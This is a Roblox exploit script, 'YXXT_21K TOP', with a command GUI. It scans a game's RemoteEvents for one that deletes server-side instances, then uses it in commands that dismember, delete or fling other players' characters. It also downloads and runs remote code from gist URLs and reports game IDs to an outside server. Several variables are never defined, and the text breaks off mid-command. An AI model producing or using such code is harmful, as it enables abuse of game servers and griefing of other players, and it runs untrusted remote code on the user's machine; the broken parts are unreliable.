--// Services
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local UGCValidationService = game:GetService("UGCValidationService")
local TextChatService = game:GetService("TextChatService")
local Lighting = game:GetService("Lighting")
local Teams = game:GetService("Teams")

--// Player Variables
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--// Instances: New YXXT_21K GUI
local YXXT_GUI = Instance.new("ScreenGui")
local MainWindow = Instance.new("Frame")
local TitleBar = Instance.new("Frame")
local TitleLabel = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local UICorner_Close = Instance.new("UICorner")
local MainContent = Instance.new("Frame")
local CmdInput = Instance.new("TextBox")
local UICorner_CmdInput = Instance.new("UICorner")
local EatToolInput = Instance.new("TextBox")
local UICorner_EatToolInput = Instance.new("UICorner")
local CommandList = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local Template = Instance.new("TextLabel")
local UICorner_Template = Instance.new("UICorner")
local UIPadding_Template = Instance.new("UIPadding")
local UICorner_List = Instance.new("UICorner")
local UICorner_Main = Instance.new("UICorner")
local UICorner_TitleBar = Instance.new("UICorner")

--// Properties
YXXT_GUI.Name = "YXXT_21K_TOP"
YXXT_GUI.Parent = PlayerGui
YXXT_GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
YXXT_GUI.ResetOnSpawn = false

MainWindow.Name = "MainWindow"
MainWindow.Parent = YXXT_GUI
MainWindow.AnchorPoint = Vector2.new(0.5, 0.5)
MainWindow.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainWindow.BorderColor3 = Color3.fromRGB(80, 255, 255)
MainWindow.Position = UDim2.new(0.5, 0, 0.5, 0)
MainWindow.Size = UDim2.new(0, 500, 0, 350)
MainWindow.Visible = true

TitleBar.Name = "TitleBar"
TitleBar.Parent = MainWindow
TitleBar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 30)

TitleLabel.Name = "TitleLabel"
TitleLabel.Parent = TitleBar
TitleLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.BackgroundTransparency = 1.000
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Font = Enum.Font.SourceSansBold
TitleLabel.Text = "YXXT_21K TOP"
TitleLabel.TextColor3 = Color3.fromRGB(80, 255, 255)
TitleLabel.TextSize = 16.000

CloseButton.Name = "CloseButton"
CloseButton.Parent = TitleBar
CloseButton.AnchorPoint = Vector2.new(1, 0.5)
CloseButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
CloseButton.Position = UDim2.new(1, -5, 0.5, 0)
CloseButton.Size = UDim2.new(0, 20, 0, 20)
CloseButton.Font = Enum.Font.SourceSansBold
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(200, 200, 200)
CloseButton.TextSize = 14.000
UICorner_Close.Parent = CloseButton

MainContent.Name = "MainContent"
MainContent.Parent = MainWindow
MainContent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainContent.BackgroundTransparency = 1.000
MainContent.Position = UDim2.new(0, 0, 0, 30)
MainContent.Size = UDim2.new(1, 0, 1, -30)

CmdInput.Name = "CmdInput"
CmdInput.Parent = MainContent
CmdInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
CmdInput.BorderColor3 = Color3.fromRGB(80, 255, 255)
CmdInput.Position = UDim2.new(0.02, 0, 0.89, 0)
CmdInput.Size = UDim2.new(0.47, 0, 0, 30)
CmdInput.Font = Enum.Font.SourceSans
CmdInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
CmdInput.PlaceholderText = "Enter command..."
CmdInput.Text = ""
CmdInput.TextColor3 = Color3.fromRGB(220, 220, 220)
CmdInput.TextSize = 14.000
UICorner_CmdInput.Parent = CmdInput

EatToolInput.Name = "EatToolInput"
EatToolInput.Parent = MainContent
EatToolInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
EatToolInput.BorderColor3 = Color3.fromRGB(80, 255, 255)
EatToolInput.Position = UDim2.new(0.51, 0, 0.89, 0)
EatToolInput.Size = UDim2.new(0.47, 0, 0, 30)
EatToolInput.Font = Enum.Font.SourceSans
EatToolInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
EatToolInput.PlaceholderText = "Fire EatToolEvent..."
EatToolInput.Text = ""
EatToolInput.TextColor3 = Color3.fromRGB(220, 220, 220)
EatToolInput.TextSize = 14.000
UICorner_EatToolInput.Parent = EatToolInput

CommandList.Name = "CommandList"
CommandList.Parent = MainContent
CommandList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
CommandList.BorderColor3 = Color3.fromRGB(80, 255, 255)
CommandList.Position = UDim2.new(0.02, 0, 0.03, 0)
CommandList.Size = UDim2.new(0.96, 0, 0.83, 0)
CommandList.CanvasSize = UDim2.new(0, 0, 0, 0)
CommandList.ScrollBarImageColor3 = Color3.fromRGB(80, 255, 255)
CommandList.ScrollBarThickness = 6

UIListLayout.Parent = CommandList
UIListLayout.Padding = UDim.new(0, 5)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

Template.Name = "Template"
Template.Parent = CommandList
Template.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Template.Size = UDim2.new(0.98, 0, 0, 40)
Template.Font = Enum.Font.SourceSans
Template.Text = "Template Command - This is a description."
Template.TextColor3 = Color3.fromRGB(200, 200, 200)
Template.TextSize = 13.000
Template.TextWrapped = true
Template.TextXAlignment = Enum.TextXAlignment.Left
Template.Visible = false -- Template is not visible by default
UICorner_Template.Parent = Template
UIPadding_Template.Parent = Template
UIPadding_Template.PaddingLeft = UDim.new(0, 8)
UIPadding_Template.PaddingRight = UDim.new(0, 8)

UICorner_List.Parent = CommandList
UICorner_Main.Parent = MainWindow
UICorner_TitleBar.Parent = TitleBar
UICorner_TitleBar.CornerRadius = UDim.new(0, 8)

--// Drag Script for MainWindow
local function DragScript()
	local gui = MainWindow
	local dragging = false
	local dragInput
	local dragStart
	local startPos

	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			if input.Position.Y < (gui.AbsolutePosition.Y + TitleBar.AbsoluteSize.Y) then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end
	end)

	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - dragStart
			gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)
end
coroutine.wrap(DragScript)()

if not game:IsLoaded() then game.Loaded:Wait() end
--[[Variables]]--
local debugOutput = true
local checkTime = 0.33
local flySpeed = 50
local character
local isMobile = UserInputService.TouchEnabled
local isTesting = game.PlaceId == 16245218863
local modernChat = TextChatService.ChatVersion == Enum.ChatVersion.TextChatService
local chatEvents = (not modernChat) and ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
local prefix = ";"
local prefixEnum = Enum.KeyCode.Semicolon

--// GUI References from the new design
local gui = YXXT_GUI
local main = MainWindow
local box = CmdInput
local cmdsFrame = main -- The main window now serves this purpose
local cmdsList = CommandList
local cmdTemplate = Template
local remotepath = Instance.new("TextLabel", gui) -- Create a dummy one to avoid errors, but hide it
remotepath.Visible = false

local genv = (getgenv and (getgenv() ~= getfenv()) and getgenv()) or _G
local gethiddenproperty
if pcall(function() gethiddenproperty(LocalPlayer,"SimulationRadius") end) then
	gethiddenproperty = gethiddenproperty
else
	gethiddenproperty = function(i, v) return UGCValidationService:GetPropertyValue(i, v) end
end
local sethiddenproperty = sethiddenproperty or function(inst,i,v) pcall(function() inst[i] = v end) end
local isnetworkowner = isnetworkowner or function(part) return part.ReceiveAge == 0 end
local wordList = {"delete", "remove", "destroy", "clean", "clear","bullet", "bala", "shoot", "shot", "fire", "segway", "handless", "sword", "attack", "despawn", "deletar", "apagar"}
local camera = workspace.CurrentCamera
local mouse = LocalPlayer:GetMouse()
task.delay(2,function()
	if character then return end
	-- This part is no longer needed as the template is hidden
end)
character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local testInstance = LocalPlayer:WaitForChild("StarterGear",1)
if not testInstance then return error("no test instance found") end

genv.connections = {}
local commands = {}
local remotes = {}
local services = {}
local privilegeLevels = {}
local rankNames = {"admin", "owner", "self"}
local bans = {}
local loopkills = {}
local infected = {}
local killauras = {}
local kickauras = {}
local wslocks = {}
local useSegway = false
local slockEnabled = false
local clickDelete = false
local clickDeleteBox
local inDatabase = false
local scaleValues = {
	"BodyProportionScale", "BodyWidthScale", "BodyHeightScale",
	"BodyDepthScale", "HeadScale", "BodyTypeScale"
}
local limbs = {"arm", "leg", "foot"}

function httpget(url)
	if isTesting then
		return ReplicatedStorage:WaitForChild("request"):InvokeServer(url)
	end
	return game:HttpGet(url)
end

--[[Test game compatibility]]--
if isTesting then
	function loadstring(src)
		return require(ReplicatedStorage:WaitForChild("Loadstring"))(src)
	end
	local files = PlayerGui:WaitForChild("workspace")
	function isfile(str)
		return files:FindFirstChild(str or "") and true or false
	end
	function writefile(str,txt)
		local val = isfile(str or "") and files[str] or Instance.new("StringValue", files)
		val.Name = str or ""
		val.Value = txt
	end
	function readfile(str)
		if not files:FindFirstChild(str or "") then return error("file " .. (str or "") .. " does not exist") end
		return files[str].Value
	end
	function listfiles(str)
		local res = {}
		for _, v in pairs(files:GetChildren()) do
			table.insert(res, v.Name)
		end
		return res
	end
	function loadfile(str)
		if not files:FindFirstChild(str or "") then return error("file " .. (str or "") .. " does not exist") end
		return loadstring(files[str].Value)
	end
end

--[[Set up admin system logic]]--
for _, v in pairs(Players:GetPlayers()) do
	privilegeLevels[v.Name] = 0
end
privilegeLevels[LocalPlayer.Name] = 3
table.insert(genv.connections, Players.PlayerAdded:Connect(function(plr)
	privilegeLevels[plr.Name] = 0
end))
table.insert(genv.connections, Players.PlayerRemoving:Connect(function(plr)
	privilegeLevels[plr.Name] = nil
end))

--[[Misc. functions]]--
function debugPrint(...)
	if not debugOutput then return end
	warn(...)
end
debugPrint("loaded UI")
function notify(title,text,duration)
	StarterGui:SetCore("SendNotification", {
		Title = title or "",
		Text = text or "",
		Duration = duration or 5
	})
end
local function getKeyCode(char)
	local byte = char:lower():byte()
	for _, v in pairs(Enum.KeyCode:GetEnumItems()) do
		if v.Value == byte then return v end
	end
end
function findPlayers(input)
	if input == nil or input == "" then return {LocalPlayer} end
	local inputLower = input:lower()
	local allPlayers = Players:GetPlayers()
	local targets = {}
	if inputLower == "me" then return {LocalPlayer} end
	if inputLower == "all" then return allPlayers end
	if inputLower == "others" then
		for _, v in pairs(allPlayers) do
			if v ~= LocalPlayer then table.insert(targets, v) end
		end
		return targets
	end
	if inputLower == "random" then return {allPlayers[math.random(1,#allPlayers)]} end
	for _, v in pairs(allPlayers) do
		if v.Name:lower():find(inputLower) or v.DisplayName:lower():find(inputLower) then
			table.insert(targets, v)
		end
	end
	return targets
end
function abort()
	for _, v in pairs(genv.connections) do
		if typeof(v) == "Instance" then v:Destroy() else v:Disconnect() end
	end
	gui:Destroy()
	if modernChat then TextChatService.TextChannels["RBXGeneral"].OnIncomingMessage = nil end
	if clickDeleteBox then clickDeleteBox:Destroy() end
	genv.delete, genv.connections, genv.foundRemote = nil, nil, nil
end
local function lerp(a, b, m)
	return a + (b - a) * m
end

--[[Update variables]]--
table.insert(genv.connections, LocalPlayer.CharacterAdded:Connect(function(char)
	character = char
end))

--[[ GUI Toggle Logic ]]--
main.Visible = false
local function toggleMain()
	main.Visible = not main.Visible
	if main.Visible then
		box:CaptureFocus()
	else
		box:ReleaseFocus()
	end
end
table.insert(genv.connections, UserInputService.InputBegan:Connect(function(input, processed)
	if processed and UserInputService:GetFocusedTextBox() ~= box then return end
	if input.KeyCode == prefixEnum then
		toggleMain()
	end
end))

CloseButton.MouseButton1Click:Connect(toggleMain)

--// EatToolEvent Logic
EatToolInput.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local text = EatToolInput.Text
		EatToolInput.Text = "" -- Clear the box
		local remoteEvent = ReplicatedStorage:FindFirstChild("EatToolEvent")
		if remoteEvent and remoteEvent:IsA("RemoteEvent") then
			remoteEvent:FireServer(text)
			debugPrint("Fired EatToolEvent with:", text)
		else
			warn("EatToolEvent not found in ReplicatedStorage!")
		end
	end
end)

--[[Find destroy remote & save to working games list]]--
local remoteJSON
local function hasFiles()
	return (isfile and readfile and writefile)
end
local function checkList(str)
	local s,l = pcall(listfiles,str)
	return s and #l > 0 and l
end
local function listFiles()
	if isTesting then return listfiles() end
	local list = checkList("") or checkList("/") or checkList("\\") or checkList("./") or {}
	return list
end
local function getGameList()
	if not isfile("yxxt_games.json") then
		writefile("yxxt_games.json", "[]")
		return {}
	end
	local content = readfile("yxxt_games.json")
	return HttpService:JSONDecode(content)
end
local function checkFile()
	if not hasFiles() then return end
	for i,v in pairs(getGameList()) do
		if i ~= tostring(game.PlaceId) then continue end
		for _, instance in pairs(game:GetDescendants()) do
			if not (instance:IsA("RemoteEvent") and instance.Name == v) then continue end
			genv.foundRemote = instance
			remotepath.Visible = false
			--inDatabase = true
			break
		end
	end
end
local function sendGame()
	if isTesting then return require(ReplicatedStorage:FindFirstChild("addgame")) end
	loadstring(httpget("https://gist.githubusercontent.com/someunknowndude/670b864d99ce22d69ca9d365a3145bb0/raw"))()
end
local function logGameLocally()
	local games = getGameList()
	games[tostring(game.PlaceId)] = genv.foundRemote.Name
	writefile("yxxt_games.json", HttpService:JSONEncode(games))
end
local function hexDecodeChar(hex)
	return string.char(tonumber(hex,16))
end
local function urlDecode(str)
	return string.gsub(str,"%%(%x%x)", hexDecodeChar)
end
local function checkDatabase()
	local res, succ, err
	succ, err = pcall(function()
		res = httpget("https://eli.serv00.net/checkgame.php?id="..tostring(game.PlaceId))
		remoteJSON = HttpService:JSONDecode(res)
	end)
	if not succ then return debugPrint("database check failed:", err) end
	if remoteJSON["success"] then
		local decoded = urlDecode(remoteJSON["result"])
		debugPrint(remoteJSON["result"])
		inDatabase = true
		if genv.foundRemote then return end
		for _, instance in pairs(game:GetDescendants()) do
			if instance:IsA("RemoteEvent") and instance.Name == decoded then
				genv.foundRemote = instance
				remotepath.Visible = false
				break
			end
		end
	end
end

debugPrint("initialised vars and funcs")
checkFile()
task.spawn(checkDatabase)

if not genv.foundRemote then
	for _, service in pairs(game:GetChildren()) do
		local s, _ = pcall(function() return service.ClassName end)
		if not s then continue end
		if service.ClassName:lower() == "replicatedstorage" or service.ClassName:lower() == "workspace" then continue end
		table.insert(services, service)
	end
	local function checkRemote(remote)
		if not remote.Parent then return end
		if not modernChat and remote.Parent.Name == "DefaultChatSystemChatEvents" then return end
		if remote.Parent.Name == "RobloxReplicatedStorage" then return end
		debugPrint(remote.Name)
		remotepath.Text = remote:GetFullName()
		if remote.Name == "DestroySegway" then
			remote:FireServer(testInstance, {Value = testInstance})
		else
			remote:FireServer(testInstance)
		end
		task.wait(checkTime + (isMobile and 0.1 or 0) + (LocalPlayer:GetNetworkPing()*2))
		if LocalPlayer:FindFirstChild("StarterGear") then return end
		genv.foundRemote = remote
		useSegway = remote.Name == "DestroySegway"
		debugPrint("found!")
		remotepath.TextColor3 = Color3.new(0,1,0)
		task.wait(.5)
		remotepath.Visible = false
		return true
	end
	local function scan(instance, softScan)
		checkTime = softScan and 0.75 or 0.5
		for _, v in pairs(instance:GetDescendants()) do
			if genv.foundRemote then return end
			if not v:IsA("RemoteEvent") or v:FindFirstChild("__FUNCTION") or table.find(remotes,v) then continue end
			table.insert(remotes, v)
			if softScan then
				for _, phrase in pairs(wordList) do
					if v.Name:lower():find(phrase) then
						checkRemote(v)
						break
					end
				end
			else
				checkRemote(v)
			end
		end
	end

	local scanOrder = {
		{ReplicatedStorage, true, "soft rs"}, {PlayerGui, true, "soft pgui"}, {workspace, true, "soft ws"},
		{ReplicatedStorage, false, "aggro rs"}, {PlayerGui, false, "aggro pgui"}, {workspace, false, "aggro ws"}
	}
	for _, data in pairs(scanOrder) do
		if genv.foundRemote then break end
		debugPrint(data[3])
		scan(data[1], data[2])
	end
	if not genv.foundRemote then
		debugPrint("aggro all")
		for _, v in pairs(services) do
			if genv.foundRemote then break end
			scan(v, false)
		end
	end
end

if not genv.foundRemote then
	notify("Unsupported Game", "This game is not supported. GUI will close.", 10)
	task.wait(3)
	gui:Destroy()
	return debugPrint("no silly remote found :(")
end

if hasFiles() and getGameList()[tostring(game.PlaceId)] == nil then
	logGameLocally()
end

function delete(instance)
	if instance == genv.foundRemote then return end
	genv.foundRemote:FireServer(instance, useSegway and {Value = instance} or nil )
	debugPrint("deleted instance " .. instance.Name)
end
genv.delete = genv.delete or delete

--[[Add command logic]]--
function addCommand(cmdName, callback, aliases, securityLevel)
	table.insert(commands,{
		name = cmdName:lower(),
		callback = callback,
		aliases = aliases or {},
		securityLevel = securityLevel or 3
	})
end

function runCommand(cmdName, ...)
	local commandToRun
	for _, v in pairs(commands) do
		if v.name == cmdName or table.find(v.aliases, cmdName) then
			commandToRun = v
			break
		end
	end
	if commandToRun then
		pcall(commandToRun.callback, ...)
	end
end

local function handleCommand(text, caller)
	local split = text:split(" ")
	local enteredCommand = split[1]:lower()
	local command
	local target = split[2] or caller.Name
	local input = table.concat(split, " ", 2, #split)

	for _, v in pairs(commands) do
		if v.name == enteredCommand or table.find(v.aliases, enteredCommand) then
			command = v
			break
		end
	end

	if not command then return end
	if privilegeLevels[caller.Name] < command.securityLevel then return end

	runCommand(command.name, findPlayers(target), input, caller or LocalPlayer)
end

--[[Add chat command functionality]]--
local function handleChat(data)
	local message = modernChat and data.Text or data.Message
	local plr = modernChat and Players:GetPlayerByUserId(data.TextSource.UserId) or Players:FindFirstChild(data.FromSpeaker)
	if not plr or privilegeLevels[plr.Name] == 0 then return end
	if message:sub(1,1) ~= prefix then return end

	handleCommand(message:sub(2,-1), plr)
end

if modernChat then
	TextChatService.TextChannels["RBXGeneral"].OnIncomingMessage = function(data) handleChat(data) end
else
	local messageEvent = chatEvents and chatEvents:FindFirstChild("OnMessageDoneFiltering")
	if messageEvent then
		table.insert(genv.connections, messageEvent.OnClientEvent:Connect(handleChat))
	end
end

--[[Add command bar functionality]]--
table.insert(genv.connections, box.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		handleCommand(box.Text, LocalPlayer)
		box.Text = ""
		box:ReleaseFocus()
	end
end))

--[[Add plugin support]]--
if listfiles and hasFiles() then
	local success, files = pcall(listFiles)
	if success and type(files) == "table" then
		for _, v in pairs(files) do
			if v:sub(-5,-1) == ".qcmd" then -- Kept for compatibility
				pcall(function() task.spawn(function() loadstring(readfile(v))() end) end)
			end
		end
	end
end

--[[Create commands]]--
-- The extensive list of commands from the original script follows here.
-- No changes are needed for the command logic itself.
addCommand("cmds", function()
	main.Visible = true -- Just makes sure the main window is visible
end, {"commands"}, 3)
addCommand("setprefix", function(plrs,newPrefix)
	local char = newPrefix:sub(1,1)
	if char == "" then prefix = ";" return end
	prefix = char
	prefixEnum = getKeyCode(char)
end, {"prefix"}, 3)
addCommand("setbind", function()
	uis.InputBegan:Wait() -- fires Return KeyCode
	local enum = uis.InputBegan:Wait().KeyCode
	prefixEnum = enum
end, {"bind"}, 3)
addCommand("admin", function(plrs)
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		privilegeLevels[v.Name] = 1
		debugPrint(`{v.Name} has been made an admin`)
	end
end, {"addadmin"}, 2)
addCommand("unadmin", function(plrs)
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		privilegeLevels[v.Name] = 0
		debugPrint(`{v.Name} is no longer an admin`)
	end
end, {"removeadmin"}, 2)
addCommand("owner", function(plrs)
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		privilegeLevels[v.Name] = 2
		debugPrint(`{v.Name} has been made an owner`)
	end
end, {"addowner", "op"}, 3)
addCommand("unowner", function(plrs)
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		privilegeLevels[v.Name] = 0
		debugPrint(`{v.Name} is no longer an owner`)
	end
end, {"removeowner", "deop"}, 3)
addCommand("ranks", function()
	local printString = "\nYXXT_21K TOP ranks:\n"
	for name,level in pairs(privilegeLevels) do
		if level == 0 then continue end
		local plr = players:FindFirstChild(name)
		if not plr then continue end
		local displayName = plr.DisplayName
		local rank = rankNames[level]
		printString ..= `{displayName}` .. ((name ~= displayName and ` (@{name})`) or "") .. ` - {rank}\n`
	end
	print(printString)
end, {"admins", "owners"}, 3)
addCommand("aliases", function()
	local printString = "\nYXXT_21K TOP command aliases:\n"
	for i,v in pairs(commands) do
		local aliases = v.aliases
		if #aliases == 0 then continue end
		local aliasString = ""
		for index, alias in pairs(aliases) do
			aliasString ..= alias .. (index == #aliases and "" or ", ")
		end
		printString ..= `{v.name}: [{aliasString}]\n`
	end
	print(printString)
end, {}, 3)
addCommand("explorer", function()
	if isTesting then
		require(rStorage:WaitForChild("dex"))
	else
		loadstring(httpget("https://gist.githubusercontent.com/someunknowndude/8ee80f941d68d5f95e5982165e9ad42d/raw"))() -- credits to TacticalBFG and Moon for original dark dex v2
	end
end, {"dex"}, 3)
addCommand("goto", function(plrs)
	local target
	local part
	for i,v in pairs(plrs) do
		local tChar = v.Character
		if not tChar then continue end
		part = tChar:FindFirstChild("HumanoidRootPart") or tChar:FindFirstChild("Head") or tChar:FindFirstChild("Torso") or tChar:FindFirstChild("LowerTorso") or tChar:FindFirstChildOfClass("BasePart")
		if not part then continue end
		break
	end
	if not part then return end
	character:PivotTo(part.CFrame * CFrame.new(0,0,2))
	local hrp = character:FindFirstChild("HumanoidRootPart")
	for i = 1,10 do
		if not hrp then return end
		hrp.AssemblyLinearVelocity = Vector3.zero
		hrp.AssemblyAngularVelocity = Vector3.zero
		task.wait(.05)
	end
end, {"to"}, 3)
local viewConnection
addCommand("view", function(plrs)
	local target
	for i,v in pairs(plrs) do
		local char = v.Character
		if not char then continue end
		local hum = char:FindFirstChild("Humanoid") or char:FindFirstChild("HumanoidRootPart")
		if not hum then continue end
		target = hum
		break
	end
	if not target then return end
	if viewConnection then viewConnection:Disconnect() end
	viewConnection = players[target.Parent.Name].CharacterAdded:Connect(function(char)
		local hum = char:WaitForChild("Humanoid")
		if not hum then return end
		camera.CameraSubject = hum
	end)
	table.insert(genv.connections,viewConnection)
	camera.CameraSubject = target
end, {"spectate"}, 3)
addCommand("unview", function(plrs)
	if viewConnection then viewConnection:Disconnect() end
	camera.CameraSubject = character.Humanoid or character:FindFirstChildOfClass("BasePart")
end, {}, 3)
addCommand("rejoin", function()
	if #players:GetPlayers() <= 1 then
		localPlayer:Kick("Rejoining!!")
		task.wait(.1)
		game:GetService("TeleportService"):Teleport(game.PlaceId, localPlayer)
		return
	end
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,localPlayer)
end, {"rj"}, 3)
addCommand("reset", function()
	local hum = character:FindFirstChild("Humanoid")
	local hrp = character:FindFirstChild("HumanoidRootPart") or hum and hum.RootPart
	local oldPosition = hrp and hrp.CFrame
	for i,v in pairs(character:GetChildren()) do
		if not v:IsA("Part") then continue end
		v.CFrame = CFrame.new(0, workspace.FallenPartsDestroyHeight+5,0)
	end
	task.wait(.1)
	if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
	character:BreakJoints()
	if not oldPosition then return end
	local newHrp = localPlayer.CharacterAdded:Wait():WaitForChild("HumanoidRootPart")
	newHrp.CFrame = oldPosition
end, {"re", "respawn"}, 3)
local torsoNoclipLoop,torsoFlingLoop,torsoFlyLoop,oldHeight,flingTorso
addCommand("torsofling", function()
	if torsoFlyLoop then return end
	local hum = character:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	flingTorso = hum.RigType == Enum.HumanoidRigType.R6 and character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
	if not flingTorso then return end
	character.Archivable = true
	local fakeChar = character:Clone()
	fakeChar.Name = "wacky fake char"
	local fakeHrp = fakeChar.HumanoidRootPart
	local fakeHum = fakeChar.Humanoid
	for i,v in pairs(fakeChar:GetChildren()) do
		if v:IsA("BasePart") then
			v.Transparency = 1
			continue
		end
		if v:IsA("Humanoid") then continue end
		v:Destroy()
	end
	oldHeight = workspace.FallenPartsDestroyHeight
	if not isTesting then workspace.FallenPartsDestroyHeight = -2^32-1 end
	hum:ChangeState(16)
	task.wait(.1)
	delete(hum)
	repeat task.wait() until hum.Parent ~= character
	for i,v in pairs(character:GetChildren()) do
		if v == flingTorso then continue end
		delete(v)
	end
	fakeHum.PlatformStand = true
	fakeHrp.Anchored = true
	workspace.CurrentCamera.CameraSubject = flingTorso
	fakeChar.Parent = workspace
	localPlayer.Character = fakeChar
	task.wait()
	torsoNoclipLoop = rs.Stepped:Connect(function()
		flingTorso.CanCollide = false
		for i,v in pairs(fakeChar:GetChildren()) do
			if not v:IsA("BasePart") then continue end
			v.CanCollide = false
		end
	end)
	table.insert(genv.connections,torsoNoclipLoop)
	torsoFlingLoop = rs.RenderStepped:Connect(function(dt)
		flingTorso.AssemblyLinearVelocity = Vector3.new(10000,10000,10000)
	end)
	table.insert(genv.connections,torsoFlingLoop)
	torsoFlyLoop = rs.Heartbeat:Connect(function(deltaTime)
		local moveDir = fakeHum.MoveDirection * (flySpeed * deltaTime)
		local hrpCF = fakeHrp.CFrame
		local cameraCF = camera.CFrame
		local cameraOffset = hrpCF:ToObjectSpace(cameraCF).Position + hum.CameraOffset
		cameraCF = cameraCF * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
		local cameraPos = cameraCF.Position
		local hrpPos = hrpCF.Position
		local objectSpaceVelocity = CFrame.new(cameraPos, Vector3.new(hrpPos.X, cameraPos.Y, hrpPos.Z)):VectorToObjectSpace(moveDir)
		fakeHrp.CFrame = CFrame.new(hrpPos) * (cameraCF - cameraPos) * CFrame.new(objectSpaceVelocity)
		flingTorso.CFrame = fakeHrp.CFrame
	end)
	table.insert(genv.connections,torsoFlyLoop)
end, {"tfling"}, 3)
addCommand("untorsofling",function()
	if not torsoFlingLoop then return end
	localPlayer.Character = flingTorso.Parent
	torsoFlingLoop:Disconnect()
	torsoFlyLoop:Disconnect()
	torsoNoclipLoop:Disconnect()
	torsoFlingLoop = nil
	torsoFlyLoop = nil
	torsoNoclipLoop = nil
	if not isTesting then workspace.FallenPartsDestroyHeight = oldHeight end
	for i = 1,10 do
		flingTorso.AssemblyLinearVelocity = Vector3.zero
		flingTorso.AssemblyAngularVelocity = Vector3.zero
		flingTorso.Position = Vector3.new(0,oldHeight + 2,0)
		task.wait()
	end
	local fakeChar = workspace:FindFirstChild("wacky fake char")
	if not fakeChar then return end
	fakeChar:Destroy()
end, {"untfling"}, 3)
addCommand("eat", function(plrs, args)
	for _, plr in ipairs(plrs) do
		local char = plr.Character
		if not char then continue end
		local step = 0
		for _, item in ipairs(char:GetChildren()) do
			if item:IsA("Accessory") or item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then
				delete(item)
			end
		end
		for _, joint in ipairs(char:GetDescendants()) do
			if joint:IsA("Motor6D") then
				local name = joint.Name:lower()
				if name:find("shoulder") then
					step += 1
					task.delay(step * 0.35, function()
						delete(joint)
					end)
				end
			end
		end
		for _, joint in ipairs(char:GetDescendants()) do
			if joint:IsA("Motor6D") then
				local name = joint.Name:lower()
				if name:find("hip") or name:find("knee") or name:find("ankle") then
					step += 1
					task.delay(step * 0.35, function()
						delete(joint)
					end)
				end
			end
		end
		local neck = char:FindFirstChild("Neck", true)
		if neck then
			step += 1
			task.delay(step * 0.35, function()
				delete(neck)
			end)
		end
		local hum = char:FindFirstChildOfClass("Humanoid")
		if hum then
			step += 1
			task.delay(step * 0.35, function()
				delete(hum)
			end)
		end
		step += 1
		task.delay(step * 0.35, function()
			for _, part in ipairs(char:GetDescendants()) do
				if part:IsA("BasePart") then
					local n = part.Name:lower()
					if n:find("torso") then
						delete(part)
					end
				end
			end
		end)
	end
end, {"consume", "erase", "vanish", "obliterate"}, 0)
addCommand("fling", function(plrs)
	local hum = character:FindFirstChild("Humanoid")
	if not hum then return end
	local hrp = hum.RootPart
	if not hrp then return end
	local oldState = hum:GetState()
	local oldPosition = hrp.CFrame
	local oldDesroyHeight = workspace.FallenPartsDestroyHeight
	hum:ChangeState(16)
	if not isTesting then workspace.FallenPartsDestroyHeight = -2^32 end
	task.wait(.2)
	local flingConnection = rs.RenderStepped:Connect(function()
		hrp.AssemblyLinearVelocity = Vector3.new(1000,10000,1000)
	end)
	for i,v in pairs(plrs) do
		if v == localPlayer then continue end
		local char = v.Character
		if not char then continue end
		local thum = char:FindFirstChild("Humanoid")
		local thrp = thum and thum.RootPart or char:FindFirstChild("HumanoidRootPart")
		if not thrp then continue end
		hrp.CFrame = thrp.CFrame
		local posConnection = rs.Heartbeat:Connect(function()
			local pos = {thrp.Position.X + (thrp.Velocity.X / 2), thrp.Position.Y + (thrp.Velocity.Y / 2), thrp.Position.Z + (thrp.Velocity.Z / 2)}
